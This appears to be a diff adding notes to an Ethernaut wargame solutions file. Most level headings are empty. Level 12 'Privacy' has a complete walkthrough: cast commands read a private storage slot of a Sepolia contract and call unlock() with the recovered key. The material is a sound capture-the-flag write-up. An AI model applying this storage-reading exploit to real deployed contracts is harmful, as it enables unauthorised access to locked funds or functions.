@@ -2,6 +2,20 @@
 
 ## Notes
 
+### Level 01 - Hello Ethernaut
+
+### Level 02 - Fallback
+
+### Level 03 - Coin Flip
+
+### Level 04 - Telephone
+
+### Level 05 - Token
+
+### Level 06 - Delegation
+
+### Level 07 - Force
+
 ### Level 08 - Vault
 
 This level demonstrates that all data on the blockchain is public, even if marked as `private` in Solidity.
@@ -99,3 +113,81 @@ function isLastFloor(uint256) external returns (bool) {
     }
 }
 ```
+
+### Level 12 - Privacy
+
+This level demonstrates that all data on the blockchain is public and accessible, even if variables are marked as `private` in Solidity.
+
+**Steps to solve:**
+
+1. **Understand the storage layout**
+   - The contract has a `bytes32[3] private data` array
+   - The unlock function requires the first 16 bytes of `data[2]` to unlock the contract
+   - Due to Solidity's storage layout, `data[2]` is stored at storage slot 5
+
+2. **Read the storage at slot 5 to get data[2]**
+   ```bash
+   cast storage 0xd02113fA1907e896939c6FA3fD3dBE7E63060c09 5 --rpc-url $SEPOLIA_RPC_URL
+   ```
+
+   Result:
+   ```
+   0x7b16735bad0f51bc24904d07ac5b2329c297b105c1ba46743e3e30215f48f756
+   ```
+
+3. **Extract first 16 bytes and call unlock**
+   - The `unlock()` function requires bytes16, which is the first half of the bytes32 value
+   - Extract the first 32 characters after 0x: `0x7b16735bad0f51bc24904d07ac5b2329`
+
+   ```bash
+   cast send 0xd02113fA1907e896939c6FA3fD3dBE7E63060c09 "unlock(bytes16)" 0x7b16735bad0f51bc24904d07ac5b2329 --rpc-url $SEPOLIA_RPC_URL
+   ```
+
+   Verification:
+   ```bash
+   # Check if locked is now false (0)
+   cast storage 0xd02113fA1907e896939c6FA3fD3dBE7E63060c09 0 --rpc-url $SEPOLIA_RPC_URL
+   # Result: 0x0000000000000000000000000000000000000000000000000000000000000000
+   ```
+
+### Level 13 - Gatekeeper One
+
+### Level 14 - Gatekeeper Two
+
+### Level 15 - Naught Coin
+
+### Level 16 - Preservation
+
+### Level 17 - Recovery
+
+### Level 18 - Magic Number
+
+### Level 19 - Alien Codex
+
+### Level 20 - Denial
+
+### Level 21 - Shop
+
+### Level 22 - Dex
+
+### Level 23 - Dex Two
+
+### Level 24 - Puzzle Wallet
+
+### Level 25 - Motorbike
+
+### Level 26 - DoubleEntryPoint
+
+### Level 27 - Good Samaritan
+
+### Level 28 - Gatekeeper Three
+
+### Level 29 - Switch
+
+### Level 30 - HigherOrder
+
+### Level 31 - Stake
+
+### Level 32 - Impersonator
+
+### Level 33 - Magic Animal Carousel
